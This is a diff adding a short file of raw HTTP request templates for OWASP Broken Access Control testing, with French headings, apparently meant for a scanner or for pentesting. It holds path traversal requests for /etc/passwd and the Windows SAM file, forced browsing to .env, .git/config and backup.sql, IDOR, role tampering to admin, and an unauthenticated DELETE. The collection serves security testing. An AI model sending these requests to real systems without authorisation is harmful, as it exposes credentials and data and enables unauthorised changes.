@@ -1,0 +1,47 @@
+# OWASP Top 10 - A01:2021 Broken Access Control
+# Tentatives d'accès non autorisé à des ressources
+
+### Path Traversal - Linux
+GET /download?file=../../../../etc/passwd HTTP/1.1
+Host: {{host}}
+User-Agent: Mozilla/5.0
+
+### Path Traversal - Windows
+GET /download?file=..\..\..\..\windows\system32\config\sam HTTP/1.1
+Host: {{host}}
+User-Agent: Mozilla/5.0
+
+### IDOR - Accès direct à un objet
+GET /api/users/1337/profile HTTP/1.1
+Host: {{host}}
+Authorization: Bearer user123_token
+
+### Force Browsing - Admin panel
+GET /admin/dashboard HTTP/1.1
+Host: {{host}}
+User-Agent: Mozilla/5.0
+
+### Parameter Tampering - Élévation de privilèges
+POST /api/users/update HTTP/1.1
+Host: {{host}}
+Content-Type: application/json
+Content-Length: 45
+
+{"user_id": 123, "role": "admin", "active": true}
+
+### HTTP Verb Tampering
+DELETE /api/users/1 HTTP/1.1
+Host: {{host}}
+User-Agent: Mozilla/5.0
+
+### Forced Browsing - Backup files
+GET /backup.sql HTTP/1.1
+Host: {{host}}
+
+### Forced Browsing - Config files
+GET /.env HTTP/1.1
+Host: {{host}}
+
+### Forced Browsing - Git exposure
+GET /.git/config HTTP/1.1
+Host: {{host}}
